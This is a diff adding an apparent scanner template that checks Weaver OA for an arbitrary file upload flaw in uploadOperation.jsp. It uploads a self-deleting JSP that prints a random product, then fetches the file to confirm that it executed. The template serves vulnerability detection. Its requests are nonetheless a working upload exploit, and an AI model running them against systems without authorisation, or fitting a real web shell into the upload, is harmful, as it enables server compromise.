@@ -1,0 +1,47 @@
+id: poc-yaml-weaver-oa-uploadoperation-arbitrary-file-upload
+
+info:
+  name: Weaver OA Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+  description: |
+    Weaver OA is vulnerable to arbitrary file upload, allowing attackers to upload malicious files to the server.
+
+variables:
+  r1: "{{rand_base(4)}}"
+  r2: "{{rand_int(40000, 44800)}}"
+  r3: "{{rand_int(40000, 44800)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/page/exportImport/uploadOperation.jsp"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo"
+    body: |-
+      ------WebKitFormBoundaryFy3iNVBftjP6IOwo
+      Content-Disposition: form-data; name="file"; filename="{{r1}}.jsp"
+      Content-Type: application/octet-stream
+
+      <%out.print({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/page/exportImport/fileTransfer/{{r1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{to_number(r2) * to_number(r3)}}"
+        part: body
